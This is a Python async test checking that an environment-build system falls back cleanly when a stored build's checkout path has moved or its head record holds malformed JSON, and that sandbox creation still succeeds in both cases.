async def test_a_build_with_its_checkout_elsewhere_or_an_unreadable_head_falls_back(fl, world):
    eb = envbuilds.of(fl)
    await fl.create("appenv", repo=world.url)
    await drain(fl)
    b = eb.active("docker", "appenv", repo_key(world.url))
    assert b.path == "/workspace/app"
    eb._put(b.model_copy(update={"path": "/srv/app"}))
    sb = await fl.create("appenv", repo=world.url)
    assert sb.info["env_build"]["fallback"] and "checkout at /srv/app" in sb.info["env_build"]["reason"]
    fl.store.kv_set(envbuilds._head_key("docker", "appenv", repo_key(world.url)), "{not json")
    sb = await fl.create("appenv", repo=world.url)  # a broken record never fails a create
    assert sb.state.value == "running" and sb.info["env_build"]["fallback"]
